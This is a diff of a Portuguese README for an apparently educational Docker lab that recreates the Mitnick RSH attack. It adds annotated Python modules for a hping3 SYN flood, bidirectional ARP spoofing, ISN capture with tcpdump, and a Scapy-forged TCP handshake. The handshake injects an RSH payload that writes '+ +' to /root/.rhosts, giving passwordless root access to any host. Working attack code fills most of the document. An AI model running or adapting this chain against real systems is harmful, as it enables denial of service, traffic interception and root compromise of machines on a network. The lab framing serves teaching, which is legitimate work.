@@ -241,228 +241,428 @@ rsh 10.0.2.20 ls -la /root/
 
 ## 7. Módulos do Código
 
-### `main.py` — Orquestrador
+Esta seção apresenta o código completo de cada módulo com anotações detalhadas explicando cada decisão de implementação.
+
+---
+
+### 7.1 `main.py` — Orquestrador
 
 **Localização:** `mitnick/main.py`
 
-O script central que gerencia o ciclo de vida completo do ataque usando threads Python para coordenar operações paralelas.
+O script central que gerencia o ciclo de vida do ataque. Usa threads Python para coordenar as cinco operações simultâneas (DoS, ARP spoofing, sniffing, SYN forjado e injeção de payload).
 
-**Configuração:**
+#### Constantes de configuração
+
 ```python
-TRUSTED_SERVER_IP = "10.0.2.30"   # IP do servidor confiável (impersonado)
-TARGET_IP         = "10.0.2.20"   # IP do alvo (X-Terminal)
-RSH_PORT          = 514            # Porta do serviço RSH
-CLIENT_PORT       = 1023           # Porta de origem forjada (< 1024 = privilegiada)
-INTERFACE         = "eth0"         # Interface de rede do container atacante
+TRUSTED_SERVER_IP = "10.0.2.30"  # IP que impersonamos; consta no /root/.rhosts do alvo
+TARGET_IP         = "10.0.2.20"  # Vítima que roda o RSH via xinetd
+RSH_PORT          = 514           # Porta padrão do protocolo RSH
+CLIENT_PORT       = 1023          # Porta de origem forjada — deve ser < 1024 (veja abaixo)
+INTERFACE         = "eth0"        # NIC do container atacante na bridge Docker
 ```
 
-**Fluxo de execução:**
+**Por que `CLIENT_PORT = 1023`?**
+O daemon `in.rshd` exige que a porta de origem do cliente seja um número *privilegiado* (abaixo de 1024). Isso é uma verificação rudimentar de que o chamador possui root no sistema de origem — em Unix clássico, apenas root pode fazer `bind()` em portas abaixo de 1024. Como estamos forjando a identidade do servidor confiável, precisamos satisfazer essa checagem. A porta 1023 é a mais alta dentro da faixa privilegiada e convencionalmente usada em conexões RSH legítimas.
+
+#### Bloqueio de RSTs do próprio kernel
+
+```python
+def setup_rst_block():
+    run_command([
+        "iptables", "-A", "OUTPUT",
+        "-p", "tcp", "--tcp-flags", "RST", "RST",
+        "-j", "DROP",
+    ])
+```
+
+**Por que essa regra é indispensável?**
+Quando o alvo recebe nosso SYN forjado (com `src=10.0.2.30`), ele responde com um SYN/ACK. Graças ao envenenamento ARP, esse SYN/ACK é entregue fisicamente ao nosso container (`10.0.2.10`), não ao servidor real. Ao receber um SYN/ACK referente a uma conexão que *ele nunca abriu*, o kernel Linux reage automaticamente enviando um pacote RST para o alvo — o que destruiria a sessão forjada no mesmo instante.
+
+A regra `iptables DROP RST` intercepta esse RST antes que ele saia da NIC, preservando a sessão. É o único meio de conter esse comportamento automático do kernel sem recompilar o stack TCP.
+
+```python
+def cleanup_rst_block():
+    run_command([
+        "iptables", "-D", "OUTPUT",   # -D deleta; mesma spec que -A
+        "-p", "tcp", "--tcp-flags", "RST", "RST",
+        "-j", "DROP",
+    ])
+```
+
+`-D` com a mesma especificação exata de `-A` garante que apenas *nossa* regra seja removida, sem afetar outras regras de OUTPUT que possam existir no container.
+
+#### Thread do DoS
+
+```python
+def dos_thread_func(target_ip, target_port, stop_event):
+    process = start_dos_attack(target_ip, target_port)
+    stop_event.wait()   # dorme até main() sinalizar fim
+    stop_dos_attack(process)
+```
+
+**Por que usar `threading.Event` em vez de um loop com `time.sleep()`?**
+Um loop com sleep desperdiçaria CPU em polling e atrasaria o encerramento. O `Event.wait()` bloqueia a thread de forma eficiente (sem consumir CPU) e acorda exatamente quando `stop_event.set()` é chamado no bloco `finally`, garantindo encerramento imediato e limpo.
+
+#### Thread do Sniffer e lista compartilhada
+
+```python
+def sniffer_thread_func(target_ip, server_ip, client_port, results_list):
+    isn = sniff_for_syn_ack(target_ip, server_ip, client_port)
+    if isn is not None:
+        results_list.append(isn)
+```
+
+**Por que uma lista e não um valor de retorno?**
+`threading.Thread` não propaga valores de retorno — o valor retornado pela função da thread é simplesmente descartado. Uma lista mutável passada por referência é o padrão idiomático em Python para comunicação de resultado entre threads sem recorrer a `queue.Queue` ou `concurrent.futures`. A lista é segura aqui porque apenas esta thread escreve nela, e `main()` só a lê após o `sniffer_thread.join()`.
+
+#### Fluxo de execução e ordem crítica das operações
 
 ```
 main()
  │
- ├─ setup_rst_block()         # iptables DROP RST saindo do atacante
+ ├─[0] setup_rst_block()             # deve vir antes de QUALQUER pacote ser enviado
  │
- ├─ Thread: dos_thread        # hping3 SYN flood no servidor (background)
- │   └─ start_dos_attack()
+ ├─[1] Thread: dos_thread (daemon)   # preenche backlog do servidor antes do SYN forjado
+ │      └─ time.sleep(1)             # aguarda hping3 saturar a fila
  │
- ├─ start_bidirectional_arpspoof()  # 2x arpspoof em background
+ ├─[2] start_bidirectional_arpspoof()
+ │      └─ time.sleep(2)             # aguarda envenenamento ARP propagar nas tabelas dos hosts
  │
- ├─ Thread: sniffer_thread    # tcpdump aguardando SYN/ACK
- │   └─ sniff_for_syn_ack()
+ ├─[3] Thread: sniffer_thread        # DEVE iniciar antes do SYN forjado (veja abaixo)
+ │      └─ time.sleep(1)             # aguarda tcpdump abrir e compilar o filtro BPF
  │
- ├─ send_spoofed_syn()        # dispara SYN forjado
+ ├─[4] send_spoofed_syn()            # dispara o SYN; alvo responde com SYN/ACK
  │
- ├─ sniffer_thread.join()     # aguarda captura do ISN
+ ├─[5] sniffer_thread.join()         # bloqueia até o ISN ser capturado (ou timeout)
  │
- ├─ complete_handshake_and_inject()  # ACK + payload RSH
+ ├─[6] complete_handshake_and_inject()
  │
- └─ finally: cleanup
-     ├─ stop_arpspoof()
-     ├─ cleanup_rst_block()   # remove regra iptables
-     └─ stop_dos_event.set()  # encerra hping3
+ └─[finally]
+      stop_arpspoof()       # restaura roteamento normal primeiro
+      cleanup_rst_block()   # depois permite RSTs novamente
+      stop_dos_event.set()  # por último; servidor pode se recuperar após nosso ataque
 ```
 
-**`setup_rst_block()` e `cleanup_rst_block()`:**
+**Por que o sniffer é iniciado antes do SYN forjado?**
+Existe uma janela de tempo muito curta entre o alvo receber o SYN e enviar o SYN/ACK (tipicamente sub-milissegundo na LAN Docker). Se o sniffer não estiver ativo e com o filtro BPF compilado antes do SYN ser enviado, o SYN/ACK pode chegar e ser descartado antes que o tcpdump comece a escutar — e a oportunidade de capturar o ISN seria perdida permanentemente.
+
+**Por que `daemon=True` no dos_thread?**
+Uma thread daemon é encerrada automaticamente quando o processo principal termina, sem precisar de `.join()` explícito. Isso é uma rede de segurança: se o `finally` falhar catastroficamente, o hping3 não ficará rodando como órfão.
+
+#### Bloco `finally` e ordem de teardown
 
 ```python
-iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+finally:
+    if arpspoof_processes:
+        stop_arpspoof(arpspoof_processes)   # 1º: restaura ARP
+    cleanup_rst_block()                     # 2º: permite RSTs
+    if dos_thread and dos_thread.is_alive():
+        stop_dos_event.set()
+        dos_thread.join()                   # 3º: para flood
 ```
 
-Bloqueia RSTs saindo do próprio kernel do atacante. Quando o alvo envia o SYN/ACK para o IP `10.0.2.30` (que em sua tabela ARP aponta para o MAC do atacante), o kernel do atacante recebe o pacote e, por não ter iniciado aquela conexão, normalmente enviaria um RST automático. Esta regra previne essa interferência.
+A ordem importa:
+1. **ARP primeiro:** restaurar o roteamento permite que os hosts se comuniquem normalmente de novo.
+2. **iptables depois:** habilitar RSTs de volta antes de parar o flood seria inócuo, pois o servidor ainda estaria inacessível.
+3. **DoS por último:** o servidor só consegue recuperar sua backlog queue depois que o flood para.
 
 ---
 
-### `attack/dos.py` — SYN Flood
+### 7.2 `attack/dos.py` — SYN Flood
 
 **Localização:** `mitnick/attack/dos.py`
 
-Implementa o ataque de Negação de Serviço usando a ferramenta `hping3`.
+**Papel no ataque:** O servidor confiável (`10.0.2.30`) nunca iniciou a conexão que estamos forjando. Quando o alvo responder ao nosso SYN com um SYN/ACK, esse pacote chegará ao servidor real (se o ARP ainda não estiver totalmente envenenado) ou o servidor verá no estado de sua pilha TCP uma conexão inexistente e enviará RST. O SYN Flood esgota a backlog queue do servidor, fazendo com que ele ignore silenciosamente novas conexões em vez de rejeitá-las com RST.
 
 ```python
 def start_dos_attack(target_ip, target_port):
     command = [
         "hping3",
-        "-S",             # envia apenas pacotes SYN
+        "-S",              # flag SYN: menor pacote TCP válido → máxima taxa de envio
         "-p", str(target_port),
-        "--flood",        # velocidade máxima, sem throttling
-        "--rand-source",  # IPs de origem aleatórios (dificulta bloqueio por IP)
+        "--flood",         # desabilita qualquer throttling; envia na velocidade da NIC
+        "--rand-source",   # IP de origem aleatório em cada pacote (veja abaixo)
         target_ip,
     ]
+    # Popen (não run/call): mantém hping3 vivo em background enquanto o ataque prossegue
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return process
 ```
 
-**Por que `--rand-source`?** Se o hping3 usasse sempre o IP real do atacante (`10.0.2.10`), o servidor poderia usar SYN cookies ou bloquear aquele IP específico. Com IPs aleatórios, cada SYN ocupa uma entrada diferente na backlog queue.
+**Por que `--rand-source` é crítico?**
+Se todos os SYNs viessem do mesmo IP (`10.0.2.10`), o servidor poderia:
+- Usar SYN cookies (desabilitado via `tcp_syncookies=0` no docker-compose, mas não em produção)
+- Retornar RST para aquele IP específico, esvaziando sua entrada da backlog queue
 
-**Por que rodar via `subprocess.Popen` e não com Scapy?** O `hping3` é otimizado para inundação de pacotes em velocidade máxima, rodando em C com acesso direto a raw sockets. Implementar a mesma taxa com Scapy em Python seria significativamente mais lento e menos eficaz.
+Com IPs aleatórios, cada SYN ocupa uma entrada *diferente* na fila half-open. Não há como o servidor drenar a fila via RST porque as origens são efêmeras e nunca repetem.
 
-**`stop_dos_attack(process)`:** Chama `process.terminate()` (SIGTERM) seguido de `process.wait()`, garantindo que o processo do hping3 seja encerrado limpo.
+**Por que `hping3` e não Scapy para o flood?**
+O `hping3` é um binário em C que acessa raw sockets diretamente, sem o overhead de um interpretador. Ele consegue enviar centenas de milhares de pacotes por segundo. Um loop Scapy em Python é limitado pelo GIL e pelo custo de construção e serialização de objetos Python por pacote — ordens de magnitude mais lento. Para saturar uma backlog queue antes que o alvo receba e processe o SYN forjado, velocidade é o requisito central.
+
+```python
+def stop_dos_attack(process):
+    process.terminate()  # SIGTERM: permite que hping3 libere o socket e finalize stats
+    process.wait()       # aguarda encerramento real antes de prosseguir com o cleanup
+```
+
+`terminate()` + `wait()` em vez de `kill()`: SIGTERM dá ao hping3 a chance de fechar o raw socket antes de sair. Deixar um raw socket aberto poderia interferir com a regra iptables sendo removida logo depois.
 
 ---
 
-### `attack/arp_spoof.py` — Envenenamento ARP
+### 7.3 `attack/arp_spoof.py` — Envenenamento ARP Bidirecional
 
 **Localização:** `mitnick/attack/arp_spoof.py`
 
-Implementa o envenenamento ARP bidirecional usando o binário `arpspoof` da suíte `dsniff`.
+**Papel no ataque:** Para capturar o ISN do alvo precisamos que o SYN/ACK que ele envia (endereçado a `10.0.2.30`) chegue fisicamente ao nosso container. Isso é conseguido envenenando a tabela ARP do alvo para que ele associe o IP `10.0.2.30` ao nosso MAC.
 
 ```python
 def start_bidirectional_arpspoof(target1_ip, target2_ip, interface="eth0"):
-    # Diz ao ALVO que o SERVIDOR está no MAC do atacante
+    # Processo 1: diz ao ALVO (10.0.2.20) que o SERVIDOR (10.0.2.30) = nosso MAC
+    # Efeito: SYN/ACK do alvo chega ao atacante em vez do servidor real
     cmd1 = ["arpspoof", "-i", interface, "-t", target1_ip, target2_ip]
-    p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    p1   = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    # Diz ao SERVIDOR que o ALVO está no MAC do atacante
+    # Processo 2: diz ao SERVIDOR (10.0.2.30) que o ALVO (10.0.2.20) = nosso MAC
+    # Efeito: qualquer tráfego que o servidor envie ao alvo passa por nós também,
+    # impedindo que o servidor restaure sua entrada correta na tabela ARP do alvo
     cmd2 = ["arpspoof", "-i", interface, "-t", target2_ip, target1_ip]
-    p2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    p2   = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     return [p1, p2]
 ```
 
-**Por que bidirecional?** Para que o alvo encaminhe seu SYN/ACK via atacante (e não diretamente ao servidor real), apenas envenenar o cache do alvo seria suficiente. O envenenamento reverso (servidor → atacante) garante que qualquer resposta do servidor real também passe pelo atacante, eliminando race conditions.
+**Por que bidirecional?**
+Envenenar apenas o cache do alvo seria *conceitualmente* suficiente para receber o SYN/ACK. O problema é que o servidor real possui sua própria tabela ARP com a entrada correta para o alvo. Quando o servidor envia qualquer tráfego ARP (resolução ou gratuitous reply), o alvo poderia receber e restaurar a entrada correta do servidor, desfazendo nosso envenenamento. Envenenar o servidor no sentido inverso impede esse tráfego de restauração de chegar ao alvo via rota direta.
 
-**Por que `arpspoof` em vez de Scapy?** O binário `arpspoof` envia gratuitous ARP replies de forma **contínua e em alta frequência**. Um script Scapy que enviasse um único ARP seria sobrescrito pela resposta ARP legítima do servidor real dentro de frações de segundo (ARP Race Condition). O `arpspoof` vence a corrida por volume e velocidade.
+**Por que o binário `arpspoof` e não um script Scapy?**
 
-**`stop_arpspoof(processes)`:** Verifica `p.poll() is None` antes de chamar `terminate()` para não enviar sinais a processos já encerrados.
+A tabela ARP é stateful e possui TTL. Um único `scapy.sendp(ARP(...))` injeta *um* reply falso. Segundos depois, quando o alvo precisar retransmitir qualquer dado para `10.0.2.30`, ele pode revalidar a entrada ARP via broadcast, o servidor real responde, e nosso envenenamento é sobrescrito. Isso é a **ARP Race Condition**.
+
+O binário `arpspoof` envia gratuitous ARP replies *continuamente e em alta frequência* (dezenas por segundo). Por volume e velocidade, nossos replies falsos chegam mais rápido do que os legítimos conseguem restaurar o cache. É uma corrida que vencemos por saturação, não por criatividade.
+
+```python
+# stdout/stderr → DEVNULL: o output do arpspoof é verbose e repetitivo;
+# descartá-lo mantém o terminal legível sem perder nenhuma informação útil
+p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+```
+
+**Por que `ip_forward=0` no container atacante (sysctl do docker-compose)?**
+Com o ARP Spoofing ativo, os pacotes do alvo chegam ao nosso container. Se `ip_forward` estivesse habilitado, o kernel encaminharia esses pacotes ao destino real — funcionando como um roteador transparente, e o SYN/ACK chegaria ao servidor antes que o tcpdump pudesse capturá-lo. Com `ip_forward=0`, o tráfego *para* aqui, dando ao sniffer tempo para extrair o ISN.
+
+```python
+def stop_arpspoof(processes):
+    for p in processes:
+        if p.poll() is None:   # None = processo ainda em execução
+            p.terminate()
+            p.wait()
+```
+
+`p.poll()` retorna `None` se o processo ainda está vivo. Chamar `terminate()` em um processo já encerrado levantaria `OSError` em alguns sistemas. O `poll()` previne esse erro de forma elegante.
 
 ---
 
-### `attack/sniffer.py` — Captura do ISN
+### 7.4 `attack/sniffer.py` — Captura do ISN via tcpdump
 
 **Localização:** `mitnick/attack/sniffer.py`
 
-Intercepta o SYN/ACK enviado pelo alvo e extrai o ISN.
+**Papel no ataque:** Após enviarmos o SYN forjado, o alvo responde com SYN/ACK contendo seu ISN — gerado aleatoriamente pelo kernel (RFC 6528). Esse valor não pode ser previsto; precisa ser interceptado. Como o ARP Spoofing faz o SYN/ACK chegar ao nosso container, podemos capturá-lo com tcpdump e extrair o ISN para calcular os números de sequência corretos do handshake.
 
 ```python
 def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeout=10):
+    # Filtro BPF: Berkeley Packet Filter, compilado e aplicado no kernel
+    # antes de qualquer cópia para userspace — zero-copy filtering
     filter_str = (
-        f"src host {target_ip} and dst host {server_ip} "
-        f"and tcp port {client_port} "
-        f"and (tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)"
+        f"src host {target_ip} and dst host {server_ip} "  # alvo → servidor (nosso IP forjado)
+        f"and tcp port {client_port} "                      # porta de origem do nosso SYN
+        f"and (tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)"  # flags SYN+ACK
     )
-
-    command = ["tcpdump", "-i", interface, "-l", "-n", "-c", "1", filter_str]
-
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    stdout, stderr = process.communicate(timeout=timeout)
-
-    match = re.search(r"seq (\d+),", stdout)
-    if match:
-        return int(match.group(1))
-    return None
 ```
 
-**Filtro BPF detalhado:**
-- `src host 10.0.2.20` — pacote vindo do alvo
-- `dst host 10.0.2.30` — destinado ao servidor confiável (o alvo acredita estar respondendo ao servidor)
-- `tcp port 1023` — na porta de origem do nosso SYN forjado
-- `(tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)` — flags SYN e ACK ambas ativas
+**Análise do filtro BPF linha a linha:**
 
-**Por que tcpdump em vez de `scapy.sniff()`?** O `tcpdump` usa a interface de forma mais eficiente com filtros BPF aplicados no kernel, reduzindo o risco de perder o pacote em situações de alta carga. A saída é parseada via regex:
+| Cláusula | Significado | Por que é necessária |
+|---|---|---|
+| `src host 10.0.2.20` | Pacote originado pelo alvo | Filtra tráfego de outros hosts na subnet |
+| `dst host 10.0.2.30` | Destinado ao IP que impersonamos | O alvo acredita responder ao servidor real |
+| `tcp port 1023` | Porta de origem do SYN forjado | Evita capturar outro tráfego TCP do alvo |
+| `tcp[tcpflags] & (SYN\|ACK) == (SYN\|ACK)` | Ambas as flags ativas simultaneamente | Exclui SYNs puros, ACKs puros, FINs, etc. |
+
+A verificação de flags usa operações de bits diretamente no byte de flags TCP (`tcp[13]`). A forma simbólica `tcp-syn|tcp-ack` é equivalente a `0x02|0x10 = 0x12`. A operação `& 0x12 == 0x12` garante que ambas as flags estejam ativas, mas ignora RST, FIN e outras flags.
 
 ```python
-# Exemplo de output do tcpdump:
-# 12:34:56.789 IP 10.0.2.20.1023 > 10.0.2.30.514: Flags [S.], seq 2847361920, ack 123456790, ...
-match = re.search(r"seq (\d+),", stdout)
+    command = [
+        "tcpdump",
+        "-i", interface,  # interface específica: evita ambiguidade em sistemas multi-NIC
+        "-l",             # line-buffer: flush após cada linha, permite leitura em tempo real
+        "-n",             # sem resolução DNS: elimina latência de lookup reverso
+        "-c", "1",        # captura exatamente 1 pacote e encerra: sem polling desnecessário
+        filter_str,
+    ]
 ```
 
-**`timeout=10`:** Se em 10 segundos nenhum SYN/ACK for capturado, o sniffer retorna `None` e o ataque falha graciosamente.
+**Por que `tcpdump` e não `scapy.sniff()`?**
+
+O `scapy.sniff()` com filtro BPF *também* compila o filtro no kernel, mas adiciona overhead por pacote em Python para a função de callback. Em um cenário onde estamos executando um SYN Flood em paralelo (milhares de pacotes por segundo no segmento de rede), qualquer latência no processamento pode fazer com que o SYN/ACK seja processado tarde demais ou descartado da fila do socket. O `tcpdump` com `-c 1` encerra imediatamente após o primeiro match, minimizando a janela de risco. Sua saída em texto é então parseada com regex — uma operação de custo irrisório comparado à captura em si.
+
+```python
+    process = subprocess.Popen(
+        command,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,             # decodifica bytes → str automaticamente
+    )
+    # communicate() bloqueia até que tcpdump encerre (-c 1 após match, ou timeout)
+    stdout, stderr = process.communicate(timeout=timeout)
+```
+
+**Por que `timeout=10`?**
+O sniffer é iniciado antes do SYN forjado, com uma pausa de 1 segundo para o tcpdump inicializar. O alvo deve responder com SYN/ACK em menos de 1ms na LAN Docker. Um timeout de 10 segundos é generoso o suficiente para absorver qualquer lentidão de startup do container, mas curto o suficiente para o script falhar rapidamente caso o ARP Spoofing não tenha funcionado.
+
+```python
+    # Saída tcpdump típica (Flags [S.] = SYN+ACK):
+    # 12:34:56.789 IP 10.0.2.20.1023 > 10.0.2.30.514: Flags [S.], seq 2847361920, ack 123456790, ...
+    match = re.search(r"seq (\d+),", stdout)
+```
+
+O padrão `seq (\d+),` captura o número de sequência do alvo. A vírgula após os dígitos é um delimitador natural do formato tcpdump que previne matches acidentais em outros campos numéricos (como o `ack` ou o `win`).
+
+```python
+    except subprocess.TimeoutExpired:
+        # Causas prováveis:
+        # 1. ARP Spoofing não propagou: o SYN/ACK foi para o servidor real, não para nós
+        # 2. SYN forjado chegou ao alvo com IP de origem errado e foi ignorado
+        # 3. Filtro BPF muito restritivo: porta ou IP incorretos na configuração
+        process.kill()
+        return None
+```
+
+Retornar `None` em vez de lançar uma exceção permite que o orquestrador (`main.py`) faça a limpeza normalmente antes de encerrar, em vez de propagar uma exceção que poderia pular o bloco `finally`.
 
 ---
 
-### `attack/ip_spoofing.py` — Forja de Pacotes TCP
+### 7.5 `attack/ip_spoofing.py` — Forja de Pacotes TCP e Injeção RSH
 
 **Localização:** `mitnick/attack/ip_spoofing.py`
 
-O núcleo técnico do ataque: constrói e injeta pacotes com IP de origem forjado.
+**Papel no ataque:** Este módulo contém as duas ações mais críticas — o SYN que inicia a sessão forjada e o ACK+payload que planta o backdoor.
 
-#### `send_spoofed_syn()`
+#### Camada 2 vs Camada 3 — por que `send()` funciona neste ambiente
+
+O Scapy oferece duas funções de envio:
+- `send()` — Camada 3: passa pela pilha de rede do kernel (roteamento, rp_filter)
+- `sendp()` — Camada 2: escreve diretamente na interface, bypassando o kernel
+
+Em ambientes com `rp_filter=1` (reverse path filtering ativo), o kernel descartaria pacotes com IP de origem forjado porque o IP `10.0.2.30` não pertence à interface `eth0` do atacante. Nesses casos, `sendp()` com um frame `Ether()` completo seria obrigatório.
+
+Neste ambiente Docker, o `rp_filter` está efetivamente desabilitado na bridge interna e o envenenamento ARP já garante que nosso container é o "dono" do MAC para o IP `10.0.2.30` na visão do alvo. Portanto `send()` (Camada 3) funciona e produz código mais legível.
+
+#### `send_spoofed_syn()` — iniciando o handshake forjado
 
 ```python
 def send_spoofed_syn(target_ip, spoofed_ip, client_port, server_port):
-    spoofed_isn = 123456789  # ISN fixo e conhecido, necessário para calcular seq+1 depois
+    # ISN fixo e determinístico: simplifica o cálculo de seq+1 no handshake
+    # sem precisar de estado compartilhado entre funções.
+    # Em produção, um ISN aleatório seria mais difícil de detectar por assinaturas
+    # de IDS (número fixo é uma anomalia), mas para fins de laboratório a
+    # reprodutibilidade é mais valiosa.
+    spoofed_isn = 123456789
 
     syn_packet = (
-        IP(src=spoofed_ip, dst=target_ip) /
-        TCP(sport=client_port, dport=server_port, flags='S', seq=spoofed_isn)
+        IP(src=spoofed_ip, dst=target_ip) /   # src=10.0.2.30: impersonamos o servidor
+        TCP(
+            sport=client_port,   # 1023: porta privilegiada exigida pelo in.rshd
+            dport=server_port,   # 514: porta RSH do alvo
+            flags="S",           # SYN puro: sem ACK, sem dados
+            seq=spoofed_isn,     # nosso ISN conhecido
+        )
     )
 
-    send(syn_packet, verbose=0)
-    return spoofed_isn
+    send(syn_packet, verbose=0)  # verbose=0: suprime o "Sent 1 packets." do Scapy
+    return spoofed_isn           # retorna para que main() passe ao complete_handshake
 ```
 
-**Por que Scapy `send()` (Camada 3) funciona aqui?** O SYN inicial *pode* ser enviado na Camada 3 porque o roteamento interno do Docker/Linux encaminha o pacote normalmente para o destino correto. O kernel não bloqueia o envio de pacotes com IP forjado *na mesma sub-rede* em que o atacante está configurado como MITM via ARP.
+**Por que o ISN é retornado em vez de usar uma constante global?**
+Passar o ISN como parâmetro explícito entre `send_spoofed_syn()` e `complete_handshake_and_inject()` deixa o fluxo de dados visível e testável. Uma constante global escondida tornaria mais difícil entender de onde o valor vem ao ler `complete_handshake_and_inject()` isoladamente.
 
-**ISN fixo (`123456789`):** Em vez de gerar um ISN aleatório, usamos um valor fixo e determinístico. Isso simplifica o cálculo posterior (`my_seq + 1 = 123456790`) sem perda de funcionalidade no contexto do laboratório.
-
-#### `complete_handshake_and_inject()`
+#### `complete_handshake_and_inject()` — ACK, handshake e backdoor
 
 ```python
 def complete_handshake_and_inject(target_ip, spoofed_ip, client_port, server_port, my_seq, target_isn):
-    ack_num    = target_isn + 1    # confirma o ISN do alvo
-    my_next_seq = my_seq + 1       # avança nosso ISN após o SYN
+```
 
-    # --- Pacote ACK (finaliza o handshake) ---
+**Matemática completa do TCP neste contexto:**
+
+```
+Estado inicial após SYN/ACK capturado:
+  Nós enviamos:   SYN  seq=123456789
+  Alvo respondeu: SYN/ACK  seq=Y (ISN do alvo), ack=123456790
+
+  O TCP trata o SYN como se consumisse 1 byte na stream,
+  mesmo sem payload. Por isso ack=123456790 = 123456789 + 1.
+
+Pacote ACK (finaliza handshake):
+  seq = 123456789 + 1 = 123456790  ← avança nosso ponteiro após o SYN
+  ack = Y + 1                       ← confirma o SYN do alvo
+
+Pacote PSH/ACK (payload RSH):
+  seq = 123456790   ← mesmo valor: nenhum byte de dados foi enviado no ACK puro
+  ack = Y + 1       ← mesmo valor: não recebemos nada novo do alvo
+  payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"
+```
+
+```python
+    ack_num     = target_isn + 1   # confirma o SYN do alvo
+    my_next_seq = my_seq + 1       # avança nosso ponteiro de sequência pós-SYN
+
+    # --- Pacote 1: ACK (completa o three-way handshake) ---
     ack_packet = (
         IP(src=spoofed_ip, dst=target_ip) /
-        TCP(sport=client_port, dport=server_port, flags='A',
-            seq=my_next_seq, ack=ack_num)
+        TCP(
+            sport=client_port, dport=server_port,
+            flags="A",          # ACK puro, sem dados
+            seq=my_next_seq,
+            ack=ack_num,
+        )
     )
     send(ack_packet, verbose=0)
+    # Após este pacote, o alvo considera a conexão TCP estabelecida e entrega
+    # o socket ao processo in.rshd, que aguarda o payload do protocolo RSH.
+```
 
-    # --- Payload RSH ---
-    # Formato: porta_stderr\x00usuario_local\x00usuario_remoto\x00comando\x00
+```python
+    # --- Payload RSH (protocolo definido na RFC 1282) ---
+    # Formato wire: <porta-stderr>\x00<user-local>\x00<user-remoto>\x00<cmd>\x00
+    #
+    # "0"    → porta stderr = 0: não abrir canal separado para stderr
+    # "root" → usuário local (quem somos no "cliente" = o servidor confiável)
+    # "root" → usuário remoto (com quem queremos executar o comando no alvo)
+    # cmd    → "echo + + > /root/.rhosts": sobrescreve o arquivo com a entrada
+    #           wildcard "+ +" que aceita qualquer host e qualquer usuário sem senha
+    #
+    # O null byte final (\x00 após o comando) é obrigatório: sinaliza ao in.rshd
+    # o fim da string de comando. Sem ele, o daemon aguardaria mais bytes e o
+    # comando nunca seria executado.
     payload = b"0\x00root\x00root\x00echo + + > /root/.rhosts\x00"
 
-    # --- Pacote PSH/ACK (entrega o payload) ---
+    # --- Pacote 2: PSH/ACK (entrega o payload ao in.rshd) ---
     push_packet = (
         IP(src=spoofed_ip, dst=target_ip) /
-        TCP(sport=client_port, dport=server_port, flags='PA',
-            seq=my_next_seq, ack=ack_num) /
+        TCP(
+            sport=client_port, dport=server_port,
+            flags="PA",         # PSH+ACK: entrega imediata à aplicação + confirmação
+            seq=my_next_seq,    # mesmo seq do ACK anterior (nenhum dado foi enviado antes)
+            ack=ack_num,
+        ) /
         payload
     )
     send(push_packet, verbose=0)
 ```
 
-**Matemática do TCP:**
+**Por que a flag PSH é obrigatória?**
+Sem PSH, a pilha TCP do alvo pode optar por manter o dado no buffer de recepção, aguardando mais segmentos antes de entregá-lo à aplicação (algoritmo de Nagle / buffer filling). Com PSH ativo, o kernel do alvo é instruído a entregar imediatamente o conteúdo ao `in.rshd`, sem aguardar o preenchimento do buffer. Como nossa conexão forjada não enviará mais nada depois deste pacote, sem PSH o comando poderia nunca ser executado.
 
-```
-Atacante enviou:  SYN com seq=123456789
-Alvo respondeu:   SYN/ACK com seq=Y, ack=123456790
-
-Atacante envia ACK:
-  seq = 123456789 + 1 = 123456790  (avança após o SYN)
-  ack = Y + 1                       (confirma o SYN do alvo)
-
-Atacante envia PSH/ACK (payload):
-  seq = 123456790                   (mesmo seq do ACK, nenhum dado novo foi enviado antes)
-  ack = Y + 1                       (continua confirmando)
-```
-
-**Flag PSH (Push):** Instrui o alvo a entregar imediatamente o dado recebido à aplicação (RSH daemon), sem aguardar mais segmentos no buffer. Essencial para que o comando seja executado sem delay.
-
-**Payload RSH com null bytes:** O protocolo RSH separa campos com `\x00` (null byte), não com espaços ou newlines. Os campos são: porta stderr, usuário local, usuário remoto, e comando. O null byte final sinaliza o fim da string de comando ao `in.rshd`.
+**Por que o comando escolhido é `echo + + > /root/.rhosts`?**
+A entrada `+ +` no arquivo `.rhosts` é o wildcard universal do RSH: o `+` no campo de hostname significa "qualquer host" e o `+` no campo de usuário significa "qualquer usuário". Após a injeção, qualquer máquina na rede (incluindo o atacante no IP `10.0.2.10`, que *não* estava na lista original) pode conectar via RSH como root sem senha. O operador `>` (e não `>>`) substitui o arquivo inteiro — mas como o objetivo é acesso irrestrito, perder a entrada original `10.0.2.30 root` é aceitável.
 
 ---
 
